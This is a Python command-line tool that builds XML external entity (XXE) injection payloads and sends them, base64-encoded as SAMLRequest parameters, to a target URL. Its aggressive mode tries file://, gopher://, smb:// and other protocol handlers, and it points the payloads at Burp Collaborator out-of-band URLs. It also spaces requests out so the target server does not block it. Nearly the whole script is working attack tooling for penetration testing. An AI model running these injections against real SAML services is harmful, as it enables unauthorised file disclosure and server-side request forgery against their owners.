#!/bin/python3

import sys
import xxev_phase1
import xxev_phase2
import os
from string import *
from random import randint
import time
import requests
import base64

def help():
	print("REQUIRED ARGUMENTS:")
	print("\t-f{URL_FILE}    Full path of Burp Collaborator URL File")
	print("\t-o{OUTPUT_FILE} If no output file is defined, output to terminal is enabled. ")
	print("\t-t{TARGET_URL}  ")


	print("\nOPTIONAL:")
	print("\t-a Aggressive mode enabled.\tDefault is disabled.")
	print("\t-b Proxy through Burp Suite.\tDefault is disabled.")
	print("\t\tProxy intercept SHOULD be turned off to avoid timeout!")
	print("\t\tProxy settings set to: http://127.0.0.1:8080")
	print("\t-d Debug mode enabled.\tDefault is disabled.")
	print("\t-i Set request interval delay.\tDefault is 5 seconds.")
	print("\t\t-ir Random interval between 3 and 10 seconds.")
	print("\t\t-i{VALUE} Integer value in seconds.")
	print("\t-v Verbose mode enabled.\tDefault is disabled.")

	print("\nEXAMPLES:")
	print("\tbuild_vectors.py -thttp://www.example.com/ \
-f/home/user/url_file.txt -olog.txt")
	print("\tbuild_vectors.py -thttp://www.example.com/example/path \
-a -f/home/user/url_file.txt -olog.txt -d -i15")
	exit()

def url_setup(num, f):
	print("\nPlease generate", num, " Burp Collaberator URLs in:", f)
	print("\nPlease save your URLs in:", f)
	print("\nPress Enter to continue...\n\n")	
	input()
	n=0
	if os.path.exists(f):
		with open(f, 'r') as burpFile:
			try:
				for i in burpFile:
					urls.append(i.rstrip())
					if(debug):
						n+=1

			except IOError: 
				print("Could not read file URL file:", f)
				exit()
	else:
		print("Could not read file:", f)
		exit()
#	if(n<num):
#		print("WARNING: Number of URLs is less than ")
	return urls

def wait(i):
	#Pause between requests for either a random time 
	# between 3 and 10 seconds (default) or the requested interval time
	if(i==0):
		time.sleep(randint(3,10))
	else:
		time.sleep(i)


#--------------------------Program Start------------------------------


#---------------------------Setup--------------------------------

#---------Default settings-----------------
#Please do not change values directly.  Use the command line arguments.
debug=False
ag_mode=False
use_burp=False
target_url=""
url_file=""
verbose=False
output_file=""
interval=5
#----------End Defaults--------------------


for arg in sys.argv[1:]:
	if(debug):
		print("arg=",arg)
	if (arg == "-help" or arg == "help"):
		help()
	if(arg=="-a"):
		ag_mode=True
	elif(arg=="-b"):
		use_burp=True
	elif(arg[:2]=="-d"):
		debug=True
	elif(arg[:2]=="-f"):
		url_file=os.path.abspath(arg[2:])
	elif(arg[:2]=="-i"):
		if(arg[2]!="r"):
			try:
				temp=int(arg[2:])
			except ValueError:
				print("Invalid interval given.  Using default interval of", interval, "seconds.")
			if(temp >= 1):
				interval=temp
				print("Setting request interval time to", interval,"seconds.")
			else:
#				interval="" #if invalid, use default random interval
				print("No interval set.  Using default interval of", interval,"seconds.")
		else:
			interval=0
			print("Using random interval request time between 3 and 10 seconds.")

	elif(arg[:2]=="-o"):
		output_file=os.path.abspath(arg[2:])
		
	elif(arg[:2]=="-t"):
		target_url=arg[2:]
	elif(arg[:2]=="-v"):
		verbose=True
	else:
		continue

if(debug):
	print("DEBUG: ag_mode =", ag_mode)
	print("DEBUG: target_url =", target_url)
	print("DEBUG: url_file =", url_file)
	print("DEBUG: output_file =", output_file)
	print("DEBUG: interval =", interval)

if(target_url=="" or url_file==""):
	print("Please define the following arguments:")
	help()
if(output_file==""):
	verbose=True
		

if(ag_mode):
	protocols=["http://","file://","ftp://","smb://","netdoc://", "gopher://", "jar://"]
else:
	protocols=["http://"]
	
keywords=["PUBLIC", "PUBLIC \"id\"", "SYSTEM"]

vector_builder=""
vectors=xxev_phase1.vectors

#vectors=xxev_phase2.vectors


number_of_vectors=len(protocols)*len(keywords)*len(vectors)
result=[]
urls=[]

if(debug):
	print("DEBUG: number_of_vectors =", number_of_vectors)
while(len(urls) < number_of_vectors):
	urls=[]
	urls=url_setup(number_of_vectors, url_file) 	
	

#---------------------------End Setup--------------------------------------
if(output_file !=""):
	f=open(output_file,'w')


#---------------Build vectors----------------------
num_vector=0	
request=""
response=""		
for v in vectors:
	for p in protocols:
		for k in keywords:
			temp_vector=v

			#use only after burp URLs have been called and saved to burpFile 
			d=dict([("PROTOCOLHANDLE",p), ("SYSPUB",k)])		

			vector = Template(temp_vector).safe_substitute(d)
			if not vector in result:
				
				#Used to determine if the created vector has already been tested.
				result.append(vector)
				num_vector+=1

if(debug):
	for t in result:
		print(t)


#-------------Build request here---------------------------------
num_vector=0	
for vector in result:
	vector = Template(vector).safe_substitute(PUBLIC_URL_PLACEHOLDER = urls[num_vector])
	num_vector+=1
	
	#---Encode vector to b64 and return as string
	
	encoded_vector=str(base64.b64encode(vector.encode()))
	encoded_vector=(encoded_vector[2:len(encoded_vector)-1])
	body={'SAMLRequest':encoded_vector}				

	#You can set any custom headers here.
	headers={'X-Custom':'Test'}
	
	req = requests.Request('POST',target_url,headers=headers, data=body)
	r = req.prepare()

	if(debug):
		print("\n")
		print("DEBUG:",vector,"\n\n")
		print("DEBUG: target_url =",target_url)
		for i in r.headers:
			print("DEBUG:",str(i)+":",r.headers[i])
		print("DEBUG: encoded_vector =", encoded_vector)		

	#	Write to output file
	if(output_file !=""):
		
		f.write("=======================Vector==========================\n")
		f.write(str(vector)+"\n")
		f.write("=======================Request=========================\n")
		f.write(str(r.method) + ' ' + str(r.url)+"\n")
		for i in r.headers:
			f.write(i+":"+str(r.headers[i])+"\n")
		f.write(str(req.data)+"\n")



	#print out Request and Response
	print("=======================Vector==========================\n")
	print(str(vector)+"\n")
	print("=======================Request=========================\n")
	print(r.method + ' ' + r.url)
	for i in r.headers:
		print(i+":",r.headers[i])
	print(req.data)
	


	#---------------Send Request--------------

	try:
		s = requests.Session()

		#for use without Burp
		if(use_burp):
			#For using with Burp, enable this proxy.  Settings may have to be adjusted
			proxies = {  'http': 'http://127.0.0.1:8080',	}
			resp = s.send(r,	proxies=proxies)
		else:
			resp = s.send(r)
	except ConnectionError:
		print("Error: Check target URL!")
		
	#---------------------Capture Response-------------------------
	if(verbose or debug):	
		print("\n====================Response=========================\n")
		print(resp.status_code)
		for i in resp.headers:
			print(str(i)+":",resp.headers[i])
		print(resp.text)

	#------------Write response to output file, if given------------
	if (output_file!=""):
		f.write("\n====================Response=========================\n")
		f.write(str(resp.status_code)+"\n")
		for i in resp.headers:
			f.write(str(i)+":"+str(resp.headers[i])+"\n")
		f.write(resp.text+"\n")

	#To prevent being blocked by Server, wait is inserted between requests
	wait(interval)
	
f.close()

print("Number of Vectors: "+str(len(result)))
	
				 
			 
